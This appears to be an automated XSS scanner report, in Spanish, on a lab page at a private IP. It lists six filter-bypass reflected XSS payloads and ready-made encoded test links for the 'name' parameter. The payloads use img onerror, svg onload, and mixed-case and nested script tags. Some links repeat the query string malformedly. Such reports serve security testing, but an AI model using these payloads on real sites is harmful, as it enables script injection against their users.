# Reporte de Escaneo XSS

**URL Objetivo:** `http://192.168.1.63/xss/example4.php?name=hacker`

---

## Punto de Inyección: `(GET) name`

- **Tipo de XSS:** `REFLECTED`
- **Contexto Evaluado:** `PLAIN_TEXT`
- **Filtros Detectados:** `script, <script>, javascript`

### Payloads Generados (6)

```markdown
<img/src='1'/onerror=alert(1)>
<scr<sCrIpt>ipt>alert(1)</scr</sCrIpt>ipt>
<svg onload=alert(1)>
<sCrIpt>alert(1)</sCrIpt>
<img src='x' onerror=alert(1)>
<scr<script>ipt>alert(1)</scr</script>ipt>
```

---

# Enlaces Listos para Probar

### `GET` - `name`

- [Enlace 1](http://192.168.1.63/xss/example4.php?name=hacker?name=%3Cimg/src%3D%271%27/onerror%3Dalert%281%29%3E)
- [Enlace 2](http://192.168.1.63/xss/example4.php?name=hacker?name=%3Cscr%3CsCrIpt%3Eipt%3Ealert%281%29%3C/scr%3C/sCrIpt%3Eipt%3E)
- [Enlace 3](http://192.168.1.63/xss/example4.php?name=hacker?name=%3Csvg%20onload%3Dalert%281%29%3E)
- [Enlace 4](http://192.168.1.63/xss/example4.php?name=hacker?name=%3CsCrIpt%3Ealert%281%29%3C/sCrIpt%3E)
- [Enlace 5](http://192.168.1.63/xss/example4.php?name=hacker?name=%3Cimg%20src%3D%27x%27%20onerror%3Dalert%281%29%3E)
- [Enlace 6](http://192.168.1.63/xss/example4.php?name=hacker?name=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E)

